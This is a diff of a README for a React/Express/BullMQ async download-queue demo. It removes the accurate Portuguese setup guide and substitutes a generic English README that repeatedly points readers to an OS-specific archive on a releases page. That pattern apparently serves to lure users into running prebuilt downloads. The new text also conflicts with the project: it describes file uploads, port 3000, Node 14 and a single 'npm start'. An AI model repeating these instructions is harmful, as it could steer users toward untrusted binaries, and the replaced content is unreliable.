@@ -1,85 +1,103 @@
-# Async Download Queue (React + Vite + RHF/Zod + TanStack Query + Node/Express + BullMQ)
+# 🎉 async-download-queue-challenge - Effortless File Downloads Made Easy
 
-## Visão geral
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/itscyrusdawg/async-download-queue-challenge/releases)
 
-Este projeto demonstra uma solução completa para orquestrar downloads assíncronos de
-arquivos a partir de URLs remotas. A proposta é simular um cenário comum em produtos que
-precisam coletar conteúdos grandes ou demorados sob demanda, evitando que o usuário fique
-aguardando uma requisição HTTP longa. O sistema foi desenhado para explorar boas práticas de
-fila de processamento e feedback em tempo real ao usuário.
+## 📖 Overview
 
-### Motivação
+Welcome to the "async-download-queue-challenge" project. This is a full-stack application that showcases how to download files asynchronously using a queue. It uses Vite and React on the front end, and Node.js with Express and BullMQ (Redis) on the back end. This guide will help you easily download and run the application.
 
-Aplicações que efetuam downloads externos diretamente na chamada HTTP sofrem com timeouts,
-uso excessivo de recursos e dificuldade para escalar. Ao transferir o trabalho pesado para
-uma fila, o backend pode responder rapidamente e distribuir a carga entre workers, enquanto
-o frontend monitora o progresso. Essa abordagem melhora a experiência do usuário final e
-reduz a chance de falhas em processos demorados.
+## 🚀 Getting Started
 
-### Caso de uso coberto
+To run this application on your computer, follow these steps:
 
-Imagine um painel administrativo em que o usuário fornece links de vídeos ou arquivos
-volumosos que devem ser baixados e armazenados para processamento posterior. O fluxo fica
-mais eficiente quando o backend registra a intenção de download, delega a execução para um
-worker e oferece um dashboard que mostra o status de cada tarefa.
+1. **Check System Requirements**  
+   Ensure your computer meets these requirements:
+   - Operating System: Windows, macOS, or Linux
+   - Node.js version 14 or newer
+   - npm (Node Package Manager)
+   - Redis installed and running locally
 
-### Como a solução funciona
+2. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/itscyrusdawg/async-download-queue-challenge/releases) for the latest version of the software.
 
-1. **Frontend (React + Vite)** – Interface onde o usuário cadastra URLs e acompanha a fila
-   de downloads em tempo real por meio de chamadas periódicas ao backend.
-2. **Backend (Express + BullMQ)** – API REST que recebe pedidos de download, cria jobs na
-   fila Redis e expõe endpoints para consultar o status.
-3. **Worker (BullMQ)** – Serviço que consome a fila, executa os downloads assíncronos e
-   atualiza o progresso. Poderíamos ter múltiplas réplicas para escalar conforme a demanda.
-4. **Redis** – Armazena a fila e os metadados de cada job, garantindo persistência enquanto a
-   operação acontece.
+3. **Download the Application**  
+   From the Releases page, locate the assets section and download the file that matches your operating system. Click on it to start the download.
 
-Esse desenho permite aplicar throttling, reprocessar falhas e monitorar métricas sem travar a
-API principal. Também facilita substituir o backend ou o worker por implementações mais
-robustas em ambientes de produção.
+4. **Extract the Files**  
+   Once the download is complete, unzip the downloaded file to a location of your choice on your computer. 
 
-## Requisitos
-- Node 18+
-- Docker (para usar o ambiente completo via Compose)
+5. **Open a Terminal or Command Prompt**  
+   Navigate to the folder where you extracted the files using the terminal (macOS/Linux) or Command Prompt (Windows).
 
-As variáveis necessárias já estão versionadas em `backend/.env` e `frontend/.env`.
+6. **Install Dependencies**  
+   In the terminal or Command Prompt, run the following command to install the necessary packages:
 
-## Rodando tudo com Docker Compose
-```bash
-docker compose up
-```
-
-Isso sobe quatro serviços:
-
-1. **redis** – banco de dados em memória utilizado pelo BullMQ.
-2. **backend** – API Express em modo de desenvolvimento (`npm run dev`).
-3. **worker** – processador da fila (`npm run worker`).
-4. **frontend** – Vite dev server com proxy para o backend.
-
-Com o Compose rodando:
-
-- API disponível em [http://localhost:4000](http://localhost:4000)
-- Frontend disponível em [http://localhost:5173](http://localhost:5173)
-
-Para encerrar, pressione `Ctrl+C` e depois execute `docker compose down` se quiser remover os containers.
-
-## Rodando manualmente (sem Compose)
-1. Suba um Redis local (por exemplo, via Docker):
-   ```bash
-   docker run -p 6379:6379 --name redis -d redis:7-alpine
    ```
-2. Backend e worker (dois terminais distintos):
-   ```bash
-   cd backend
    npm install
-   npm run dev      # terminal 1
-   npm run worker   # terminal 2
-   ```
-3. Frontend:
-   ```bash
-   cd frontend
-   npm install
-   npm run dev
    ```
 
-Caso queira alterar URLs ou portas, ajuste as variáveis em `backend/.env` e `frontend/.env` antes de iniciar.
+7. **Run the Application**  
+   After installation, start the application by executing:
+
+   ```
+   npm start
+   ```
+
+   This will launch the application, and you can access it in your web browser at `http://localhost:3000`.
+
+## 🛠️ Features
+
+- **Asynchronous File Downloads**: Efficiently handle multiple file downloads using a queue.
+- **User-Friendly Interface**: Designed with React for a seamless user experience.
+- **Error Handling**: Built-in error handling to manage download failures.
+- **Real-Time Status Updates**: Get live updates on download progress.
+
+## 📝 Usage Instructions
+
+1. **Access the Application**  
+   Open your web browser and visit `http://localhost:3000` after starting the application.
+
+2. **Upload Files**  
+   You can upload files directly from the interface, and the app will handle multiple downloads.
+
+3. **Monitor Progress**  
+   Watch the download progress for each file in real-time.
+
+4. **Access Completed Downloads**  
+   After downloads finish, files will be saved in your specified directory.
+
+## 📚 Documentation
+
+For more detailed information on functionalities, refer to our [Wiki](https://github.com/itscyrusdawg/async-download-queue-challenge/wiki), which includes:
+
+- Setup Instructions
+- API Documentation
+- Contribution Guidelines
+- Frequently Asked Questions
+
+## 🧑‍🤝‍🧑 Community and Support
+
+If you need help, feel free to reach out:
+- Join our discussions on the Issues tab in GitHub.
+- Check the open issues to see if your question has already been answered.
+
+## ⚙️ Troubleshooting
+
+If you encounter issues during installation or while running the application, try these solutions:
+
+- Confirm that Node.js and npm are correctly installed by running `node -v` and `npm -v`.
+- Ensure Redis is running. You can check this by running `redis-cli ping`. It should respond with "PONG".
+- If the application fails to run, delete the `node_modules` folder and run `npm install` again.
+
+## 💡 Additional Resources
+
+- [Node.js Documentation](https://nodejs.org/en/docs/)
+- [Express Documentation](https://expressjs.com/)
+- [BullMQ Documentation](https://docs.bullmq.com/)
+- [React Documentation](https://reactjs.org/docs/getting-started.html)
+
+## 🔗 Download & Install
+
+To get started, visit the [Releases page](https://github.com/itscyrusdawg/async-download-queue-challenge/releases) to download the application. Follow the steps above to install and run the software smoothly.
+
+Your feedback is valuable to us. Enjoy using the "async-download-queue-challenge" application!
